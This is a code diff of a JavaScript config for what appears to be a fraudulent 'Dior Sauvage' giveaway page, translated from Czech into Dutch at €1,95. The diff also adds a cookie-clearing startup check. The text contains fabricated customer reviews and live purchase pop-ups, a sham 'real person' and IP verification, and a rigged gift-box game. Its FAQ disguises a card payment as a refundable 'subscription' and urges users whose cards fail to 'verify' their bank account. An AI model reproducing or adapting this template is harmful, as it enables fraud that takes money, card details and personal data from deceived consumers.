@@ -3,160 +3,161 @@ const orderOriginParam = window.__origin_param;
 const siteKey = "sauvage-fr";
 
 (function (exp) {
-  const countryCode = "cz";
-  const lang = "cs-CZ";
+  const countryCode = "nl";
+  const lang = "nl-NL";
   const locale = lang;
 
   const sizes = {
     enabled: false,
-    selectText: "Velikost: ",
+    selectText: "Maat: ",
     arr: ["XS", "S", "M", "M/L", "L", "L/XL", "XL", "XXL"],
   };
 
   // I FILL THIS INFO IN MAIN.JS
   const mainProduct = {
     header: "",
-    name: "Gratulujeme! <br><br> Můžete se zúčastnit propagace Dior Sauvage 100 ml!",
+    name: "Gefeliciteerd! <br><br> U kunt deelnemen aan de promotie van Dior Sauvage 100 ml!",
     oldPrice: "",
     newPrice: "",
     selectText: "",
-    text: "Dior prodává své poslední parfémy Sauvage za pouhých 49 Kč poté, co ukončil své operace ve východní Evropě. Díky nové marketingové strategii může každý Čech dnes získat jeden z 1000 parfémů 🎁.<br><br> Abyste mohli získat parfém Sauvage od Dioru, vyplňte prosím formulář a potvrďte, že jste skutečná osoba. <br><br> Pospěšte si, počet nabízených kusů je omezený!",
+    timer: "Er is niet veel tijd, haast u om uw bestelling te plaatsen!",
+    text: "Dior verkoopt zijn nieuwste Sauvage parfums voor slechts <b>1,95€</b> na het stopzetten van de activiteiten in Oost-Europa. Dankzij de nieuwe campagnestrategie kan iedereen in <b>België</b> vandaag een van de <b>1000</b> parfums bemachtigen🎁.",
   };
 
   const notifications = [
     {
-      user: "Beáta L***",
-      location: "Praha, Česko",
-      action: "Právě jsem zakoupila Dior Sauvage 100ml za 49 Kč!",
-      timeago: "před 15 sekundami",
+      user: "Bea V***",
+      location: "Amsterdam, Nederland",
+      action: "Heeft net Dior Sauvage 100ml gekocht voor €1,95!",
+      timeago: "15 seconden geleden",
     },
     {
-      user: "Tereza B***",
-      location: "Brno, Česko",
-      action: "Právě jsem zakoupila Dior Sauvage 100ml za 49 Kč!",
-      timeago: "před 25 sekundami",
+      user: "Tessa B***",
+      location: "Rotterdam, Nederland",
+      action: "Heeft net Dior Sauvage 100ml gekocht voor €1,95!",
+      timeago: "25 seconden geleden",
     },
   ];
 
   const reviewsArr = [
     {
-      name: "Lukáš",
-      time: "před 1 dnem",
-      header: "To je neuvěřitelné!",
+      name: "Lucas",
+      time: "1 dag geleden",
+      header: "Dit is ongelofelijk!",
       product: "26468782",
       image: "./assets/proof1.jpg",
-      review: "Nedávno jsem slyšel o této propagaci a rozhodl jsem se ji zakoupit. Děkuji Dior za prodej.",
+      review: "Ik hoorde onlangs over deze promotie en besloot om het te kopen. Dank aan Dior voor deze verkoop.",
     },
     {
-      name: "Antonín",
-      time: "před 2 dny",
-      header: "Fantastické! Jsem beze slov.",
+      name: "Anton",
+      time: "2 dagen geleden",
+      header: "Fantastisch! Ik ben sprakeloos.",
       product: "26468789",
       image: "./assets/proof2.jpeg",
-      review: "Děkuji. Balíček byl doručen velmi rychle.",
+      review: "Bedankt. Het pakket werd heel snel bezorgd.",
     },
     {
-      name: "Josefa",
-      time: "před 2 dny",
-      header: "Prostě úžasné.",
+      name: "Josefien",
+      time: "2 dagen geleden",
+      header: "Gewoon geweldig.",
       product: "26468783",
       image: "./assets/proof3.jpg",
-      review: "Můj manžel nechtěl, abych se zúčastnila, protože jsme o tomto prodeji neslyšeli, ale když dorazil můj balíček, byl velmi nadšený.",
+      review: "Mijn man wilde niet dat ik meedeed, omdat we nog nooit van deze verkoop hadden gehoord, maar toen mijn pakket arriveerde, was hij heel blij.",
     },
     {
-      name: "Mikuláš",
-      time: "před 4 dny",
-      header: "Miluje ho.",
+      name: "Nico",
+      time: "4 dagen geleden",
+      header: "Hij houdt ervan.",
       image: "./assets/proof4.jpg",
-      review: "Chtěl jsem tyto parfémy už dlouho a konečně mám jeden.",
+      review: "Ik wilde deze parfums al heel lang en heb er eindelijk een.",
     },
     {
       name: "Jan",
-      time: "před 7 dny",
-      header: "Wow, jsem naprosto nadšený z tohoto produktu!",
+      time: "7 dagen geleden",
+      header: "Wow, ik ben absoluut enthousiast over dit product!",
       product: "26468784",
       image: "./assets/proof5.jpg",
-      review: "Neuvěřitelné. Drahý a kvalitní parfém za pouhých 49 Kč. Děkuji!",
+      review: "Ongelooflijk. Een dure en kwalitatieve parfum voor slechts €1,95. Dank u!",
     },
   ];
 
   const reviews = {
     reviews: reviewsArr,
-    rr: "KOMENTÁŘE A HODNOCENÍ",
+    rr: "BEOORDELINGEN EN RECENSIES",
     percent: "99%",
-    rec: "Komentáře k této akci",
+    rec: "Recensies van deze actie",
   };
 
   const questions = {
-    _of: "Otázka {1} z {2}: ",
+    _of: "Vraag {1} van {2}: ",
     arr: [
       {
-        q: "Už jste někdy nosili Dior Sauvage?",
-        a: ["Ano", "Ne"],
+        q: "Heeft u ooit Dior Sauvage gedragen?",
+        a: ["Ja", "Nee"],
       },
       {
-        q: "Kde jste našli tuto frázi?",
-        a: ["Na oficiální webové stránce", "Reklamy na Facebooku", "Předáno přítelem"],
+        q: "Waar heeft u deze promotie gevonden?",
+        a: ["Op de officiële website", "Facebook advertenties", "Doorverwezen door een vriend"],
       },
       {
-        q: "K jakému účelu použijete Dior Sauvage?",
-        a: ["Na dárek", "Pro osobní použití"],
+        q: "Voor welk doel gebruikt u Dior Sauvage?",
+        a: ["Als cadeau", "Voor persoonlijk gebruik"],
       },
     ],
   };
 
   const check = {
-    title: "Vaše odpovědi se ověřují.",
-    secondTitle: "Načítání...",
+    title: "Uw antwoorden worden geverifieerd.",
+    secondTitle: "Bezig met laden...",
     arr: [
-      "Odpověděli jste na otázku 3/3",
-      "Žádné předběžné studie vaší IP.",
-      "Dárky se načítají...",
+      "U heeft vraag 3/3 beantwoord",
+      "Geen voorafgaande onderzoeken van uw IP.",
+      "Geschenken worden geladen...",
     ],
   };
 
   const modals = {
     welcome: {
       texts: {
-        header: "Gratulujeme, úspěšně jste ověřili, že jste skutečná osoba.",
+        header: "Gefeliciteerd, u heeft succesvol geverifieerd dat u een echt persoon bent.",
         button: "OK",
         text: `
       <center>
-      Dnes, {date}, máte možnost získat svůj Dior Sauvage 100ml.
+      Vandaag, {date}, heeft u de kans om uw Dior Sauvage 100ml te ontvangen.
         <br><br>
-        Stačí si jen vybrat správný dárkový balíček.
+        U hoeft alleen maar het juiste cadeaupakket te kiezen.
         <br><br>
-        Máte 3 možnosti, hodně štěstí!
+        U heeft 3 opties, veel succes!
       </center>
     `,
       },
     },
     first: {
       texts: {
-        header: "Ach ne...",
+        header: "Oh nee...",
         button: "OK",
         text: `
       <center>
-      Omlouváme se, ale tento dárek je prázdný. Zbývají vám 2 pokusy. Hodně štěstí!
+      Sorry, maar dit cadeau is leeg. U heeft nog 2 pogingen over. Veel succes!
       </center>
     `,
       },
     },
     win: {
       texts: {
-        header: `Gratulujeme! Vyhráli jste!`,
+        header: `Gefeliciteerd! U heeft gewonnen!`,
         button: "OK",
         text: `
       <center>
         <p style="color: #b51817">
-        Vyhráli jste Dior Sauvage 100ml!
+        U heeft Dior Sauvage 100ml gewonnen!
         </p>
         <br>
-        1) Klikněte na "OK" níže pro přechod na stránku platby za dopravu.
+        1) Klik op "OK" hieronder om naar de pagina voor verzendbetaling te gaan.
          <br><br>
-        2) Vyplňte formulář a zaplaťte svou objednávku, abyste obdrželi Dior Sauvage.
+        2) Vul het formulier in en betaal uw bestelling om Dior Sauvage te ontvangen.
         <br><br>
-        3) Balíček bude doručen za 5 až 7 dní.
+        3) Het pakket wordt binnen 5 tot 7 dagen bezorgd.
       </center>
     `,
       },
@@ -165,46 +166,46 @@ const siteKey = "sauvage-fr";
 
   const faqs = [
     {
-      question: "Jak dlouho budu muset čekat na svou cenu?",
-      answer: "Obvykle to trvá 5 až 7 pracovních dnů.",
+      question: "Hoe lang moet ik wachten op mijn prijs?",
+      answer: "Het duurt meestal 5 tot 7 werkdagen.",
     },
     {
-      question: "Jsou nějaké skryté náklady?",
-      answer: "Absolutně ne. Jakmile vyhrajete svou cenu a zadáte své údaje, postaráme se o zbytek. Náklady na dopravu jsou naší odpovědností!",
+      question: "Zijn er verborgen kosten?",
+      answer: "Absoluut niet. Zodra u uw prijs wint en uw gegevens invoert, zorgen wij voor de rest. De verzendkosten zijn onze verantwoordelijkheid!",
     },
     {
-      question: "Jsem výherce, proč bych měl odpovídat na otázky/hádat krabici?",
-      answer: "Ještě nejste výherce, ale byl jste jedním z 10 vybraných k pokusu získat naši cenu...",
+      question: "Ik ben een winnaar, waarom moet ik vragen beantwoorden/doos kiezen?",
+      answer: "U bent nog geen winnaar, maar u bent een van de 10 geselecteerd om te proberen onze prijs te winnen...",
     },
     {
-      question: "Jak mohu získat cenu, pokud vyhraju?",
-      answer: "Nejprve musíte zadat svou doručovací adresu a kontaktní údaje, poté vás náš systém přesměruje. Pak musíte dokázat, že nejste robot, protože cena je nabízena pouze skutečným lidem.",
+      question: "Hoe kan ik de prijs ontvangen als ik win?",
+      answer: "U moet eerst uw bezorgadres en contactgegevens invoeren, dan zal ons systeem u doorverwijzen. U moet dan bewijzen dat u geen robot bent, omdat de prijs alleen aan echte mensen wordt aangeboden.",
     },
     {
-      question: "Proč bych měl platit 49 Kč za cenu?",
-      answer: "49 Kč není cena - je to předplatné, které dokazuje, že jste skutečně člověk. Všechny platby budou vráceny po schválení.",
+      question: "Waarom moet ik €1,95 betalen voor de prijs?",
+      answer: "€1,95 is geen prijs - het is een abonnement dat bewijst dat u echt mens bent. Alle betalingen worden terugbetaald na goedkeuring.",
     },
     {
-      question: "Nemohu použít svou kreditní kartu, transakce selhala?",
-      answer: "Pokud nemůžete použít svou kreditní kartu, vaše banka blokuje transakci: musíte ověřit svůj bankovní účet.",
+      question: "Ik kan mijn creditcard niet gebruiken, de transactie is mislukt?",
+      answer: "Als u uw creditcard niet kunt gebruiken, blokkeert uw bank de transactie: u moet uw bankrekening verifiëren.",
     },
   ];
 
   const cartSteps = {
     personal: {
-      title: "Osobní údaje",
+      title: "Persoonlijke gegevens",
       fields: {
         name: {
           enabled: true,
-          field: "Jméno",
+          field: "Naam",
         },
         family: {
           enabled: true,
-          field: "Příjmení",
+          field: "Achternaam",
         },
         phone: {
           enabled: true,
-          field: "Telefonní číslo",
+          field: "Telefoonnummer",
         },
         email: {
           enabled: true,
@@ -213,48 +214,48 @@ const siteKey = "sauvage-fr";
       },
     },
     delivery: {
-      title: "Doručení",
+      title: "Bezorging",
       fields: {
         city: {
           enabled: true,
-          field: "Město",
+          field: "Stad",
         },
         address: {
           enabled: true,
-          field: "Doručovací adresa",
+          field: "Bezorgadres",
         },
         zip: {
           enabled: true,
-          field: "PSČ",
+          field: "Postcode",
         },
       },
     },
     payment: {
-      title: "Způsoby platby",
-      creditCard: "Platba online kreditní kartou",
+      title: "Betaalmethodes",
+      creditCard: "Online betalen met creditcard",
     },
   };
 
   const cart = {
     steps: cartSteps,
     main: {
-      title: "Přehled objednávky",
+      title: "Bestellingsoverzicht",
       oldPrice: "",
-      newPrice: "49 Kč",
-      size: "Velikost",
+      newPrice: "€1,95",
+      size: "Maat",
       subTotal: {
-        title: "Hodnota objednávky",
-        amount: "49 Kč",
+        title: "Bestellingswaarde",
+        amount: "€1,95",
       },
       delivery: {
-        title: "Doručení",
+        title: "Bezorging",
         amount: "0,00 €",
       },
       total: {
-        title: "Celkem",
-        amount: "49 Kč",
+        title: "Totaal",
+        amount: "€1,95",
       },
-      checkoutButton: "Zaplaťte svou objednávku",
+      checkoutButton: "Betaal uw bestelling",
     },
   };
 
@@ -265,20 +266,18 @@ const siteKey = "sauvage-fr";
       miniImg: "./assets/slide_1.png",
 
       images: [
-        "./assets/slide_1.png",
-        "./assets/slide_2.png",
+        // "./assets/slide_1.png",
+        // "./assets/slide_2.png",
         "./assets/slide_3.jpg",
-        "./assets/slide_4.jpg",
+        // "./assets/slide_4.jpg",
       ],
     },
   ];
 
-
-
-
   const footer = {
-    cr: "© 2024 DIOR. All rights reserved.",
+    cr: "© 2024 DIOR. Alle rechten voorbehouden.",
   };
+
 
 
   const pathImgBox = {
@@ -309,6 +308,16 @@ const siteKey = "sauvage-fr";
   };
 })(window);
 
+const starupCheck = () => {
+  if (getCookie("__firstStart") != null) {
+    return;
+  } else {
+    localStorage.clear();
+    clearSiteSpecificCookies();
+    setCookie("__firstStart", true);
+  }
+};
+
 window.addEventListener("load", () => {
   for (let path of Object.values(window.__config.pathImgBox)) {
     let link = document.createElement("link");
@@ -317,6 +326,8 @@ window.addEventListener("load", () => {
     link.rel = "preload";
     document.head.appendChild(link);
   }
+  starupCheck();
+  timerInit();
 });
 
 function setCookie(name, value, days = 30) {
@@ -342,24 +353,7 @@ function getCookie(name) {
   return decodeURI(dc.substring(begin + prefix.length, end));
 }
 
-// function clearCookies() {
-//   var cookies = document.cookie.split("; ");
-//   for (var c = 0; c < cookies.length; c++) {
-//     var d = window.location.hostname.split(".");
-//     while (d.length > 0) {
-//       var cookieBase = encodeURIComponent(cookies[c].split(";")[0].split("=")[0]) + '=; expires=Thu, 01-Jan-1970 00:00:01 GMT; domain=' + d.join('.') + ' ;path=';
-//       var p = location.pathname.split('/');
-//       document.cookie = cookieBase + '/';
-//       while (p.length > 0) {
-//         document.cookie = cookieBase + p.join('/');
-//         p.pop();
-//       };
-//       d.shift();
-//     }
-//   }
-// }
-
-const clearCookies = () => document.cookie.split(';').forEach(c => document.cookie = c.replace(/^ +/, '').replace(/=.*/, `=;expires=${new Date().toUTCString()};path=/`));
+const clearAllCookies = () => document.cookie.split(';').forEach(c => document.cookie = c.replace(/^ +/, '').replace(/=.*/, `=;expires=${new Date().toUTCString()};path=/`));
 
 const clearSiteSpecificCookies = () => {
   document.cookie.split(';').forEach(cookie => {
@@ -378,15 +372,6 @@ const clearSiteSpecificCookies = () => {
 };
 
 
-const starupCheck = () => {
-  if (getCookie("__firstStart") != null) {
-    return;
-  } else {
-    localStorage.clear();
-    clearSiteSpecificCookies();
-    setCookie("__firstStart", true);
-  }
-};
 
 const lsSelectProduct = (val) =>
   setCookie("__selected_product", val);
